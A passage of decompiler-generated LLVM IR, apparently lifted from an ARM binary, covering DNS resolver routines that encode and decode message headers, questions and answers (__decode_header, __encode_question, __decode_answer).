  %tmp18 = inttoptr i32 %arg2 to i8*
  %v1_16b20 = add i32 %tmp, 1
  %v2_16b20 = inttoptr i32 %v1_16b20 to i8*
  %v3_16b20 = load i8, i8* %v2_16b20, align 1
  store i8 %v3_16b20, i8* %tmp18, align 1
  %v2_16b28 = load i32, i32* %arg1, align 4
  %v1_16b2c = trunc i32 %v2_16b28 to i8
  %v4_16b2c = add i32 %arg2, 1
  %v5_16b2c = inttoptr i32 %v4_16b2c to i8*
  store i8 %v1_16b2c, i8* %v5_16b2c, align 1
  %v0_16b30 = load i32, i32* %lr.global-to-local, align 4
  %v1_16b30 = add i32 %v0_16b30, 12
  %v2_16b30 = inttoptr i32 %v1_16b30 to i32*
  %v3_16b30 = load i32, i32* %v2_16b30, align 4
  %v1_16b34 = add i32 %v0_16b30, 4
  %v2_16b34 = inttoptr i32 %v1_16b34 to i32*
  %v3_16b34 = load i32, i32* %v2_16b34, align 4
  %v1_16b38 = add i32 %v0_16b30, 16
  %v2_16b38 = inttoptr i32 %v1_16b38 to i32*
  %v3_16b38 = load i32, i32* %v2_16b38, align 4
  %v1_16b3c = add i32 %tmp, 8
  %v2_16b3c = inttoptr i32 %v1_16b3c to i32*
  %v3_16b3c = load i32, i32* %v2_16b3c, align 4
  %v2_16b40 = icmp eq i32 %v3_16b30, 0
  %. = select i1 %v2_16b40, i32 0, i32 4
  %v2_16b4c = icmp eq i32 %v3_16b34, 0
  %v1_16b50 = add i32 %v0_16b30, 20
  %v2_16b50 = inttoptr i32 %v1_16b50 to i32*
  %v3_16b50 = load i32, i32* %v2_16b50, align 4
  store i32 %v3_16b50, i32* @ip, align 4
  %storemerge12 = select i1 %v2_16b4c, i32 0, i32 128
  %v1_16b5c = urem i32 %v3_16b3c, 16
  %v2_16b60 = icmp eq i32 %v3_16b38, 0
  %.29 = select i1 %v2_16b60, i32 0, i32 2
  %v4_16b6c = mul nuw nsw i32 %v1_16b5c, 8
  %v5_16b6c = or i32 %v4_16b6c, %.
  %v2_16b70 = icmp eq i32 %v3_16b50, 0
  br i1 %v2_16b70, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_16b20
  %v2_16b74 = or i32 %v5_16b6c, 1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_16b20, %bb25
  %v1_16b7c = phi i32 [ %v5_16b6c, %dec_label_pc_16b20 ], [ %v2_16b74, %bb25 ]
  %v2_16b78 = or i32 %.29, %storemerge12
  %v2_16b7c = or i32 %v2_16b78, %v1_16b7c
  %v1_16b80 = trunc i32 %v2_16b7c to i8
  %v2_16b80 = load i32, i32* %r4.global-to-local, align 4
  %v3_16b80 = add i32 %v2_16b80, 2
  %v4_16b80 = inttoptr i32 %v3_16b80 to i8*
  store i8 %v1_16b80, i8* %v4_16b80, align 1
  %v0_16b84 = load i32, i32* %lr.global-to-local, align 4
  %v1_16b84 = add i32 %v0_16b84, 24
  %v1_16b88 = inttoptr i32 %v1_16b84 to i32*
  %v2_16b88 = load i32, i32* %v1_16b88, align 4
  %v3_16b88 = add i32 %v0_16b84, 28
  %v4_16b88 = inttoptr i32 %v3_16b88 to i32*
  %v5_16b88 = load i32, i32* %v4_16b88, align 4
  %v2_16b8c = icmp eq i32 %v2_16b88, 0
  %v1_16b90 = urem i32 %v5_16b88, 16
  %.30 = select i1 %v2_16b8c, i32 0, i32 128
  %v2_16b9c = or i32 %v1_16b90, %.30
  %v1_16ba0 = trunc i32 %v2_16b9c to i8
  %v2_16ba0 = load i32, i32* %r4.global-to-local, align 4
  %v3_16ba0 = add i32 %v2_16ba0, 3
  %v4_16ba0 = inttoptr i32 %v3_16ba0 to i8*
  store i8 %v1_16ba0, i8* %v4_16ba0, align 1
  %v0_16ba4 = load i32, i32* %lr.global-to-local, align 4
  %v1_16ba4 = add i32 %v0_16ba4, 33
  %v2_16ba4 = inttoptr i32 %v1_16ba4 to i8*
  %v3_16ba4 = load i8, i8* %v2_16ba4, align 1
  %v2_16ba8 = load i32, i32* %r4.global-to-local, align 4
  %v3_16ba8 = add i32 %v2_16ba8, 4
  %v4_16ba8 = inttoptr i32 %v3_16ba8 to i8*
  store i8 %v3_16ba4, i8* %v4_16ba8, align 1
  %v0_16bac = load i32, i32* %lr.global-to-local, align 4
  %v1_16bac = add i32 %v0_16bac, 32
  %v2_16bac = inttoptr i32 %v1_16bac to i32*
  %v3_16bac = load i32, i32* %v2_16bac, align 4
  %v1_16bb0 = trunc i32 %v3_16bac to i8
  %v2_16bb0 = load i32, i32* %r4.global-to-local, align 4
  %v3_16bb0 = add i32 %v2_16bb0, 5
  %v4_16bb0 = inttoptr i32 %v3_16bb0 to i8*
  store i8 %v1_16bb0, i8* %v4_16bb0, align 1
  %v0_16bb4 = load i32, i32* %lr.global-to-local, align 4
  %v1_16bb4 = add i32 %v0_16bb4, 37
  %v2_16bb4 = inttoptr i32 %v1_16bb4 to i8*
  %v3_16bb4 = load i8, i8* %v2_16bb4, align 1
  %v2_16bb8 = load i32, i32* %r4.global-to-local, align 4
  %v3_16bb8 = add i32 %v2_16bb8, 6
  %v4_16bb8 = inttoptr i32 %v3_16bb8 to i8*
  store i8 %v3_16bb4, i8* %v4_16bb8, align 1
  %v0_16bbc = load i32, i32* %lr.global-to-local, align 4
  %v1_16bbc = add i32 %v0_16bbc, 36
  %v2_16bbc = inttoptr i32 %v1_16bbc to i32*
  %v3_16bbc = load i32, i32* %v2_16bbc, align 4
  %v1_16bc0 = trunc i32 %v3_16bbc to i8
  %v2_16bc0 = load i32, i32* %r4.global-to-local, align 4
  %v3_16bc0 = add i32 %v2_16bc0, 7
  %v4_16bc0 = inttoptr i32 %v3_16bc0 to i8*
  store i8 %v1_16bc0, i8* %v4_16bc0, align 1
  %v0_16bc4 = load i32, i32* %lr.global-to-local, align 4
  %v1_16bc4 = add i32 %v0_16bc4, 41
  %v2_16bc4 = inttoptr i32 %v1_16bc4 to i8*
  %v3_16bc4 = load i8, i8* %v2_16bc4, align 1
  %v2_16bc8 = load i32, i32* %r4.global-to-local, align 4
  %v3_16bc8 = add i32 %v2_16bc8, 8
  %v4_16bc8 = inttoptr i32 %v3_16bc8 to i8*
  store i8 %v3_16bc4, i8* %v4_16bc8, align 1
  %v0_16bcc = load i32, i32* %lr.global-to-local, align 4
  %v1_16bcc = add i32 %v0_16bcc, 40
  %v2_16bcc = inttoptr i32 %v1_16bcc to i32*
  %v3_16bcc = load i32, i32* %v2_16bcc, align 4
  %v1_16bd0 = trunc i32 %v3_16bcc to i8
  %v2_16bd0 = load i32, i32* %r4.global-to-local, align 4
  %v3_16bd0 = add i32 %v2_16bd0, 9
  %v4_16bd0 = inttoptr i32 %v3_16bd0 to i8*
  store i8 %v1_16bd0, i8* %v4_16bd0, align 1
  %v0_16bd4 = load i32, i32* %lr.global-to-local, align 4
  %v1_16bd4 = add i32 %v0_16bd4, 45
  %v2_16bd4 = inttoptr i32 %v1_16bd4 to i8*
  %v3_16bd4 = load i8, i8* %v2_16bd4, align 1
  %v2_16bd8 = load i32, i32* %r4.global-to-local, align 4
  %v3_16bd8 = add i32 %v2_16bd8, 10
  %v4_16bd8 = inttoptr i32 %v3_16bd8 to i8*
  store i8 %v3_16bd4, i8* %v4_16bd8, align 1
  %v0_16bdc = load i32, i32* %lr.global-to-local, align 4
  %v1_16bdc = add i32 %v0_16bdc, 44
  %v2_16bdc = inttoptr i32 %v1_16bdc to i32*
  %v3_16bdc = load i32, i32* %v2_16bdc, align 4
  %v1_16be0 = trunc i32 %v3_16bdc to i8
  %v2_16be0 = load i32, i32* %r4.global-to-local, align 4
  %v3_16be0 = add i32 %v2_16be0, 11
  %v4_16be0 = inttoptr i32 %v3_16be0 to i8*
  store i8 %v1_16be0, i8* %v4_16be0, align 1
  %v2_16bec.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16be8

dec_label_pc_16be8:                               ; preds = %entry, %bb26
  %v2_16bec = phi i32 [ %v3_16b0c, %entry ], [ %v2_16bec.pre, %bb26 ]
  %v0_16be8 = phi i32 [ -1, %entry ], [ 12, %bb26 ]
  store i32 %v2_16bec, i32* @r4, align 4
  ret i32 %v0_16be8

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 45, { 1, 0 }
  uselistorder i32 37, { 2, 1, 0 }
  uselistorder i32 33, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_16be8, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_16bf0 = load i8, i8* %arg1, align 1
  %v4_16bf0 = zext i8 %v3_16bf0 to i32
  %v2_16bf4 = add i32 %tmp, 1
  %v3_16bf4 = inttoptr i32 %v2_16bf4 to i8*
  %v4_16bf4 = load i8, i8* %v3_16bf4, align 1
  %v5_16bf4 = zext i8 %v4_16bf4 to i32
  %v4_16bf8 = mul nuw nsw i32 %v4_16bf0, 256
  %v5_16bf8 = or i32 %v5_16bf4, %v4_16bf8
  %v2_16bfc = inttoptr i32 %arg2 to i32*
  store i32 %v5_16bf8, i32* %v2_16bfc, align 4
  %v2_16c00 = add i32 %tmp, 2
  %v3_16c00 = inttoptr i32 %v2_16c00 to i8*
  %v4_16c00 = load i8, i8* %v3_16c00, align 1
  %tmp4 = icmp slt i8 %v4_16c00, 0
  %v3_16c04 = zext i1 %tmp4 to i32
  %v2_16c08 = add i32 %arg2, 4
  %v3_16c08 = inttoptr i32 %v2_16c08 to i32*
  store i32 %v3_16c04, i32* %v3_16c08, align 4
  %v4_16c0c = load i8, i8* %v3_16c00, align 1
  %div = udiv i8 %v4_16c0c, 8
  %tmp5 = urem i8 %div, 16
  %v1_16c14 = zext i8 %tmp5 to i32
  %v2_16c18 = add i32 %arg2, 8
  %v3_16c18 = inttoptr i32 %v2_16c18 to i32*
  store i32 %v1_16c14, i32* %v3_16c18, align 4
  %v4_16c1c = load i8, i8* %v3_16c00, align 1
  %div1 = udiv i8 %v4_16c1c, 4
  %tmp6 = urem i8 %div1, 2
  %v1_16c24 = zext i8 %tmp6 to i32
  %v2_16c28 = add i32 %arg2, 12
  %v3_16c28 = inttoptr i32 %v2_16c28 to i32*
  store i32 %v1_16c24, i32* %v3_16c28, align 4
  %v4_16c2c = load i8, i8* %v3_16c00, align 1
  %div2 = udiv i8 %v4_16c2c, 2
  %tmp7 = urem i8 %div2, 2
  %v1_16c34 = zext i8 %tmp7 to i32
  %v2_16c38 = add i32 %arg2, 16
  %v3_16c38 = inttoptr i32 %v2_16c38 to i32*
  store i32 %v1_16c34, i32* %v3_16c38, align 4
  %v4_16c3c = load i8, i8* %v3_16c00, align 1
  %tmp8 = urem i8 %v4_16c3c, 2
  %v1_16c40 = zext i8 %tmp8 to i32
  %v2_16c44 = add i32 %arg2, 20
  %v3_16c44 = inttoptr i32 %v2_16c44 to i32*
  store i32 %v1_16c40, i32* %v3_16c44, align 4
  %v2_16c48 = add i32 %tmp, 3
  %v3_16c48 = inttoptr i32 %v2_16c48 to i8*
  %v4_16c48 = load i8, i8* %v3_16c48, align 1
  %tmp9 = icmp slt i8 %v4_16c48, 0
  %v3_16c4c = zext i1 %tmp9 to i32
  %v2_16c50 = add i32 %arg2, 24
  %v3_16c50 = inttoptr i32 %v2_16c50 to i32*
  store i32 %v3_16c4c, i32* %v3_16c50, align 4
  %v4_16c54 = load i8, i8* %v3_16c48, align 1
  %tmp10 = urem i8 %v4_16c54, 16
  %v1_16c58 = zext i8 %tmp10 to i32
  %v2_16c5c = add i32 %arg2, 28
  %v3_16c5c = inttoptr i32 %v2_16c5c to i32*
  store i32 %v1_16c58, i32* %v3_16c5c, align 4
  %v2_16c60 = add i32 %tmp, 4
  %v3_16c60 = inttoptr i32 %v2_16c60 to i8*
  %v4_16c60 = load i8, i8* %v3_16c60, align 1
  %v5_16c60 = zext i8 %v4_16c60 to i32
  %v2_16c64 = add i32 %tmp, 5
  %v3_16c64 = inttoptr i32 %v2_16c64 to i8*
  %v4_16c64 = load i8, i8* %v3_16c64, align 1
  %v5_16c64 = zext i8 %v4_16c64 to i32
  %v4_16c68 = mul nuw nsw i32 %v5_16c60, 256
  %v5_16c68 = or i32 %v5_16c64, %v4_16c68
  %v2_16c6c = add i32 %arg2, 32
  %v3_16c6c = inttoptr i32 %v2_16c6c to i32*
  store i32 %v5_16c68, i32* %v3_16c6c, align 4
  %v2_16c70 = add i32 %tmp, 6
  %v3_16c70 = inttoptr i32 %v2_16c70 to i8*
  %v4_16c70 = load i8, i8* %v3_16c70, align 1
  %v5_16c70 = zext i8 %v4_16c70 to i32
  %v2_16c74 = add i32 %tmp, 7
  %v3_16c74 = inttoptr i32 %v2_16c74 to i8*
  %v4_16c74 = load i8, i8* %v3_16c74, align 1
  %v5_16c74 = zext i8 %v4_16c74 to i32
  %v4_16c78 = mul nuw nsw i32 %v5_16c70, 256
  %v5_16c78 = or i32 %v5_16c74, %v4_16c78
  %v2_16c7c = add i32 %arg2, 36
  %v3_16c7c = inttoptr i32 %v2_16c7c to i32*
  store i32 %v5_16c78, i32* %v3_16c7c, align 4
  %v2_16c80 = add i32 %tmp, 8
  %v3_16c80 = inttoptr i32 %v2_16c80 to i8*
  %v4_16c80 = load i8, i8* %v3_16c80, align 1
  %v5_16c80 = zext i8 %v4_16c80 to i32
  %v2_16c84 = add i32 %tmp, 9
  %v3_16c84 = inttoptr i32 %v2_16c84 to i8*
  %v4_16c84 = load i8, i8* %v3_16c84, align 1
  %v5_16c84 = zext i8 %v4_16c84 to i32
  %v4_16c88 = mul nuw nsw i32 %v5_16c80, 256
  %v5_16c88 = or i32 %v5_16c84, %v4_16c88
  %v2_16c8c = add i32 %arg2, 40
  %v3_16c8c = inttoptr i32 %v2_16c8c to i32*
  store i32 %v5_16c88, i32* %v3_16c8c, align 4
  %v2_16c90 = add i32 %tmp, 11
  %v3_16c90 = inttoptr i32 %v2_16c90 to i8*
  %v4_16c90 = load i8, i8* %v3_16c90, align 1
  %v5_16c90 = zext i8 %v4_16c90 to i32
  %v2_16c94 = add i32 %tmp, 10
  %v3_16c94 = inttoptr i32 %v2_16c94 to i8*
  %v4_16c94 = load i8, i8* %v3_16c94, align 1
  %v5_16c94 = zext i8 %v4_16c94 to i32
  %v4_16c9c = mul nuw nsw i32 %v5_16c94, 256
  %v5_16c9c = or i32 %v4_16c9c, %v5_16c90
  %v2_16ca0 = add i32 %arg2, 44
  %v3_16ca0 = inttoptr i32 %v2_16ca0 to i32*
  store i32 %v5_16c9c, i32* %v3_16ca0, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 11, { 22, 23, 6, 9, 10, 11, 16, 4, 5, 17, 18, 19, 20, 21, 0, 12, 13, 7, 14, 15, 8, 3, 2, 1, 24 }
  uselistorder i32 40, { 10, 11, 4, 13, 1, 12, 2, 0, 5, 6, 7, 8, 9, 3 }
  uselistorder i32 28, { 32, 5, 6, 7, 33, 23, 40, 37, 39, 8, 38, 1, 24, 18, 2, 34, 35, 25, 26, 27, 28, 29, 30, 0, 31, 17, 36, 19, 20, 21, 3, 4, 22, 13, 12, 10, 11, 14, 15, 9, 16 }
  uselistorder i8 2, { 0, 1, 2, 3, 7, 4, 5, 6, 8 }
  uselistorder i8 16, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8 8, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16ca8 = load i32, i32* @r4, align 4
  store i32 %v3_16ca8, i32* %stack_var_-16, align 4
  %v6_16ca8 = load i32, i32* @r5, align 4
  %v9_16ca8 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_16cb0 = load i32, i32* %arg1, align 4
  store i32 %v2_16cb0, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_16cbc = inttoptr i32 %v2_16cb0 to i8*
  %v2_16cbc = call i32 @__encode_dotted(i8* %v1_16cbc)
  store i32 %v2_16cbc, i32* %r0.global-to-local, align 4
  %v1_16cc0 = icmp slt i32 %v2_16cbc, 0
  br i1 %v1_16cc0, label %bb, label %bb6

bb:                                               ; preds = %entry
  %v5_16cc8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v5_16cc8, i32* @r4, align 4
  store i32 %v6_16ca8, i32* @r5, align 4
  store i32 %v9_16ca8, i32* @r6, align 4
  ret i32 %v2_16cbc

bb6:                                              ; preds = %entry
  %v1_16cc4 = load i32, i32* @r4, align 4
  %v2_16cc4 = sub i32 %v1_16cc4, %v2_16cbc
  %v0_16cd0 = load i32, i32* @r6, align 4
  %v2_16cd0 = add i32 %v0_16cd0, %v2_16cbc
  store i32 %v2_16cd0, i32* %r2.global-to-local, align 4
  %v7_16cd4 = icmp sgt i32 %v2_16cc4, 3
  br i1 %v7_16cd4, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  store i32 -1, i32* %r0.global-to-local, align 4
  %v10_16cd8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v10_16cd8, i32* @r4, align 4
  store i32 %v6_16ca8, i32* @r5, align 4
  store i32 %v9_16ca8, i32* @r6, align 4
  ret i32 -1

bb8:                                              ; preds = %bb6
  %v0_16cdc = load i32, i32* @r5, align 4
  %v1_16cdc = add i32 %v0_16cdc, 5
  %v2_16cdc = inttoptr i32 %v1_16cdc to i8*
  %v3_16cdc = load i8, i8* %v2_16cdc, align 1
  %v5_16ce0 = inttoptr i32 %v2_16cd0 to i8*
  store i8 %v3_16cdc, i8* %v5_16ce0, align 1
  %v0_16ce4 = load i32, i32* @r5, align 4
  %v1_16ce4 = add i32 %v0_16ce4, 4
  %v2_16ce4 = inttoptr i32 %v1_16ce4 to i32*
  %v3_16ce4 = load i32, i32* %v2_16ce4, align 4
  %v1_16ce8 = trunc i32 %v3_16ce4 to i8
  %v2_16ce8 = load i32, i32* %r2.global-to-local, align 4
  %v3_16ce8 = add i32 %v2_16ce8, 1
  %v4_16ce8 = inttoptr i32 %v3_16ce8 to i8*
  store i8 %v1_16ce8, i8* %v4_16ce8, align 1
  %v0_16cec = load i32, i32* @r5, align 4
  %v1_16cec = add i32 %v0_16cec, 9
  %v2_16cec = inttoptr i32 %v1_16cec to i8*
  %v3_16cec = load i8, i8* %v2_16cec, align 1
  %v2_16cf0 = load i32, i32* %r2.global-to-local, align 4
  %v3_16cf0 = add i32 %v2_16cf0, 2
  %v4_16cf0 = inttoptr i32 %v3_16cf0 to i8*
  store i8 %v3_16cec, i8* %v4_16cf0, align 1
  %v0_16cf4 = load i32, i32* @r5, align 4
  %v1_16cf4 = add i32 %v0_16cf4, 8
  %v2_16cf4 = inttoptr i32 %v1_16cf4 to i32*
  %v3_16cf4 = load i32, i32* %v2_16cf4, align 4
  %v0_16cf8 = load i32, i32* %r0.global-to-local, align 4
  %v1_16cf8 = add i32 %v0_16cf8, 4
  store i32 %v1_16cf8, i32* %r0.global-to-local, align 4
  %v1_16cfc = trunc i32 %v3_16cf4 to i8
  %v2_16cfc = load i32, i32* %r2.global-to-local, align 4
  %v3_16cfc = add i32 %v2_16cfc, 3
  %v4_16cfc = inttoptr i32 %v3_16cfc to i8*
  store i8 %v1_16cfc, i8* %v4_16cfc, align 1
  %v2_16d00 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16d00, i32* @r4, align 4
  store i32 %v6_16ca8, i32* @r5, align 4
  store i32 %v9_16ca8, i32* @r6, align 4
  ret i32 %v1_16cf8

; uselistorder directives
  uselistorder i32 %v2_16cbc, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v9_16ca8, { 1, 0, 2 }
  uselistorder i32 %v6_16ca8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_16d08 = call i32 @__length_dotted()
  %v1_16d0c = icmp slt i32 %v0_16d08, 0
  br i1 %v1_16d0c, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v4_16d10 = add i32 %v0_16d08, 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v5_16d14 = phi i32 [ %v0_16d08, %entry ], [ %v4_16d10, %bb ]
  ret i32 %v5_16d14

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-288 = alloca i32, align 4
  %v3_16d18 = load i32, i32* @r4, align 4
  %v6_16d18 = load i32, i32* @r5, align 4
  %v9_16d18 = load i32, i32* @r6, align 4
  %v12_16d18 = load i32, i32* @r7, align 4
  %v21_16d18 = load i32, i32* @sl, align 4
  %v2_16d1c = ptrtoint i32* %stack_var_-288 to i32
  store i32 %arg3, i32* @r5, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %v2_16d1c, i32* @r2, align 4
  store i32 256, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  %v0_16d38 = call i32 @__decode_dotted()
  store i32 %v0_16d38, i32* %r0.global-to-local, align 4
  store i32 %v0_16d38, i32* @r7, align 4
  %v1_16d3c = icmp slt i32 %v0_16d38, 0
  %v0_16d40 = load i32, i32* @r4, align 4
  %v2_16d40 = add i32 %v0_16d40, %v0_16d38
  store i32 %v2_16d40, i32* %r8.global-to-local, align 4
  br i1 %v1_16d3c, label %bb14, label %dec_label_pc_16d50

dec_label_pc_16d50:                               ; preds = %entry
  %v1_16d48 = load i32, i32* @r5, align 4
  %v2_16d48 = sub i32 %v1_16d48, %v2_16d40
  %v1_16d50 = add i32 %v2_16d48, -10
  store i32 %v1_16d50, i32* @r5, align 4
  %v6_16d50 = icmp slt i32 %v1_16d50, 0
  store i32 %v2_16d1c, i32* %r0.global-to-local, align 4
  %v0_16d58 = load i32, i32* @sl, align 4
  %v2_16d58 = add i32 %v0_16d58, %v2_16d40
  store i32 %v2_16d58, i32* @r4, align 4
  br i1 %v6_16d50, label %bb, label %dec_label_pc_16d64

bb:                                               ; preds = %dec_label_pc_16d50
  br label %bb14

dec_label_pc_16d64:                               ; preds = %dec_label_pc_16d50
  %v1_16d64 = bitcast i32* %stack_var_-288 to i8*
  %v2_16d64 = call i32 @__GI_strdup(i8* %v1_16d64)
  store i32 %v2_16d64, i32* %r0.global-to-local, align 4
  %v1_16d68 = load i32, i32* @r6, align 4
  %v2_16d68 = inttoptr i32 %v1_16d68 to i32*
  store i32 %v2_16d64, i32* %v2_16d68, align 4
  %v0_16d6c = load i32, i32* @sl, align 4
  %v1_16d6c = load i32, i32* %r8.global-to-local, align 4
  %v2_16d6c = add i32 %v1_16d6c, %v0_16d6c
  %v3_16d6c = inttoptr i32 %v2_16d6c to i8*
  %v4_16d6c = load i8, i8* %v3_16d6c, align 1
  %v6_16d6c = zext i8 %v4_16d6c to i32
  %v0_16d70 = load i32, i32* @r4, align 4
  %v1_16d70 = add i32 %v0_16d70, 1
  %v2_16d70 = inttoptr i32 %v1_16d70 to i8*
  %v3_16d70 = load i8, i8* %v2_16d70, align 1
  %v4_16d70 = zext i8 %v3_16d70 to i32
  %v4_16d74 = mul nuw nsw i32 %v6_16d6c, 256
  %v5_16d74 = or i32 %v4_16d70, %v4_16d74
  store i32 %v5_16d74, i32* %r3.global-to-local, align 4
  %v1_16d78 = load i32, i32* @r6, align 4
  %v2_16d78 = add i32 %v1_16d78, 4
  %v3_16d78 = inttoptr i32 %v2_16d78 to i32*
  store i32 %v5_16d74, i32* %v3_16d78, align 4
  %v0_16d7c = load i32, i32* @r4, align 4
  %v1_16d7c = add i32 %v0_16d7c, 2
  store i32 %v1_16d7c, i32* %r1.global-to-local, align 4
  %v2_16d80 = inttoptr i32 %v1_16d7c to i8*
  %v3_16d80 = load i8, i8* %v2_16d80, align 1
  %v4_16d80 = zext i8 %v3_16d80 to i32
  %v1_16d84 = add i32 %v0_16d7c, 3
  %v2_16d84 = inttoptr i32 %v1_16d84 to i8*
  %v3_16d84 = load i8, i8* %v2_16d84, align 1
  %v4_16d84 = zext i8 %v3_16d84 to i32
  %v4_16d88 = mul nuw nsw i32 %v4_16d80, 256
  %v5_16d88 = or i32 %v4_16d84, %v4_16d88
  store i32 %v5_16d88, i32* %r3.global-to-local, align 4
  %v1_16d8c = load i32, i32* @r6, align 4
  %v2_16d8c = add i32 %v1_16d8c, 8
  %v3_16d8c = inttoptr i32 %v2_16d8c to i32*
  store i32 %v5_16d88, i32* %v3_16d8c, align 4
  %v0_16d90 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d90 = add i32 %v0_16d90, 2
  %v1_16d94 = add i32 %v0_16d90, 3
  %v2_16d94 = inttoptr i32 %v1_16d94 to i8*
  %v3_16d94 = load i8, i8* %v2_16d94, align 1
  %v4_16d94 = zext i8 %v3_16d94 to i32
  store i32 %v4_16d94, i32* %r3.global-to-local, align 4
  %v2_16d98 = inttoptr i32 %v1_16d90 to i8*
  %v3_16d98 = load i8, i8* %v2_16d98, align 1
  %v4_16d98 = zext i8 %v3_16d98 to i32
  store i32 %v4_16d98, i32* %r0.global-to-local, align 4
  %v1_16d9c = add i32 %v0_16d90, 5
  %v2_16d9c = inttoptr i32 %v1_16d9c to i8*
  %v3_16d9c = load i8, i8* %v2_16d9c, align 1
  %v4_16d9c = zext i8 %v3_16d9c to i32
  store i32 %v4_16d9c, i32* @ip, align 4
  %v3_16da0 = mul nuw nsw i32 %v4_16d94, 65536
  store i32 %v3_16da0, i32* %r3.global-to-local, align 4
  %v1_16da4 = add i32 %v0_16d90, 4
  %v2_16da4 = inttoptr i32 %v1_16da4 to i8*
  %v3_16da4 = load i8, i8* %v2_16da4, align 1
  %v4_16da4 = zext i8 %v3_16da4 to i32
  %v4_16da8 = mul nuw i32 %v4_16d98, 16777216
  %v5_16da8 = or i32 %v4_16da8, %v3_16da0
  %v2_16dac = or i32 %v5_16da8, %v4_16d9c
  %v4_16db0 = mul nuw nsw i32 %v4_16da4, 256
  %v5_16db0 = or i32 %v2_16dac, %v4_16db0
  store i32 %v5_16db0, i32* %r3.global-to-local, align 4
  %v1_16db4 = load i32, i32* @r6, align 4
  %v2_16db4 = add i32 %v1_16db4, 12
  %v3_16db4 = inttoptr i32 %v2_16db4 to i32*
  store i32 %v5_16db0, i32* %v3_16db4, align 4
  %v0_16db8 = load i32, i32* %r1.global-to-local, align 4
  %v1_16db8 = add i32 %v0_16db8, 6
  %v2_16db8 = inttoptr i32 %v1_16db8 to i8*
  %v3_16db8 = load i8, i8* %v2_16db8, align 1
  %v4_16db8 = zext i8 %v3_16db8 to i32
  %v0_16dbc = load i32, i32* @r4, align 4
  %v1_16dbc = add i32 %v0_16dbc, 9
  %v2_16dbc = inttoptr i32 %v1_16dbc to i8*
  %v3_16dbc = load i8, i8* %v2_16dbc, align 1
  %v4_16dbc = zext i8 %v3_16dbc to i32
  %v1_16dc0 = add i32 %v0_16dbc, 10
  store i32 %v1_16dc0, i32* %r0.global-to-local, align 4
  %v4_16dc4 = mul nuw nsw i32 %v4_16db8, 256
  %v5_16dc4 = or i32 %v4_16dbc, %v4_16dc4
  store i32 %v5_16dc4, i32* %r3.global-to-local, align 4
  %v0_16dc8 = load i32, i32* %r8.global-to-local, align 4
  %v1_16dc8 = add i32 %v0_16dc8, 10
  %v0_16dcc = load i32, i32* @r5, align 4
  %v1_16dd0 = add nuw nsw i32 %v5_16dc4, 10
  store i32 %v1_16dd0, i32* %r1.global-to-local, align 4
  %v1_16dd4 = load i32, i32* @r6, align 4
  %v2_16dd4 = add i32 %v1_16dd4, 24
  %v3_16dd4 = inttoptr i32 %v2_16dd4 to i32*
  store i32 %v1_16dc8, i32* %v3_16dd4, align 4
  %v0_16dd8 = load i32, i32* %r0.global-to-local, align 4
  %v1_16dd8 = load i32, i32* @r6, align 4
  %v2_16dd8 = add i32 %v1_16dd8, 20
  %v3_16dd8 = inttoptr i32 %v2_16dd8 to i32*
  store i32 %v0_16dd8, i32* %v3_16dd8, align 4
  %v0_16ddc = load i32, i32* %r3.global-to-local, align 4
  %v1_16ddc = load i32, i32* @r6, align 4
  %v2_16ddc = add i32 %v1_16ddc, 16
  %v3_16ddc = inttoptr i32 %v2_16ddc to i32*
  store i32 %v0_16ddc, i32* %v3_16ddc, align 4
  %v0_16de0 = load i32, i32* @r7, align 4
  %v1_16de0 = load i32, i32* %r1.global-to-local, align 4
  %v2_16de0 = add i32 %v1_16de0, %v0_16de0
  %v5_16de4 = icmp slt i32 %v0_16dcc, %v5_16dc4
  %.v2_16de0 = select i1 %v5_16de4, i32 -1, i32 %v2_16de0
  br label %bb14

bb14:                                             ; preds = %bb, %dec_label_pc_16d64, %entry
